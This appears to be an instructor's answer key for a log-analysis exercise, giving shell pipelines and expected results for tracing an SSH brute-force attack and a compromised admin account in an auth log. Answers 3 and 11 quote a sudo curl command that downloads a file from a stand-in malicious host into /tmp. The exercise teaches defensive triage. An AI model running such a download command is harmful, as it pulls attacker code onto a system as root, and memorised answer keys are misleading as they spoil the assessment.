# Assignment Answer Key

Instructor only. Outputs verified against `assignment-auth.log`. Accept any command that produces the correct answer; there is more than one valid pipeline for most of these.

## Part 1
1. `wc -l assignment-auth.log` -> 25
2. `grep -c "Failed password" assignment-auth.log` -> 18
3. `tail -n 3 assignment-auth.log`. Final action: `admin` used sudo to run `curl -o /tmp/m http://evil.example/m`, downloading a file from a malicious site as root.

## Part 2
4. `grep "Accepted password" assignment-auth.log`
5. `grep -c "Invalid user" assignment-auth.log` -> 2
6. `cut -d, -f1 users.csv | tail -n +2` (or without tail; accept either)
7. `grep "45.155.205.99" assignment-auth.log`

## Part 3
8. `grep "Failed password" assignment-auth.log | grep -oE "from [0-9.]+" | cut -d' ' -f2 | sort | uniq -c | sort -rn`
   Worst offender: `45.155.205.99` with 15 failed attempts.
   Full ranking:
   ```
   15 45.155.205.99
    3 91.240.118.5
   ```
9. `grep "Accepted password" assignment-auth.log | cut -d' ' -f9 | sort | uniq -c`
   Result: `admin` accepted 1 time, `backup` accepted 3 times.
   `backup` being accepted most is normal (it is a service account logging in repeatedly from the internal IP 10.0.5.20). The single `admin` acceptance is the suspicious one, because it came from the attacker IP. This sets up question 13.

## Part 4
10. `grep "Accepted" assignment-auth.log | grep "45.155.205.99"` finds it. Line: `Sep 25 21:20:03 db02 sshd[4410]: Accepted password for admin from 45.155.205.99 port 51350 ssh2`. Time 21:20:03, account admin.
11. `Sep 25 21:23:10 ... admin : ... COMMAND=/usr/bin/curl -o /tmp/m http://evil.example/m`. The attacker used sudo to download a file from evil.example into /tmp as root.
12. Model answer: "The IP 45.155.205.99 brute-forced SSH for about 15 minutes, hammering admin, root, and several service accounts with 15 failed attempts. At 21:20 it succeeded against the admin account. Three minutes later it used sudo to curl a file from evil.example into /tmp, indicating malware download and a full compromise."

## Bonus
13. The log has successful logins for two accounts: `backup` (three times, all from 10.0.5.20, an internal address) and `admin` (once, from 45.155.205.99). The malicious one is the admin login, because its source IP is the exact same address that generated all 15 failed attempts moments earlier. Normal logins come from a consistent internal IP with no failures before them. The attacker login came from an external IP that had just been failing repeatedly. The pattern of "many failures then one success from the same IP" is the signature of a successful brute force. This is the key reasoning skill: correlating the accepted login's IP against the failing IP.
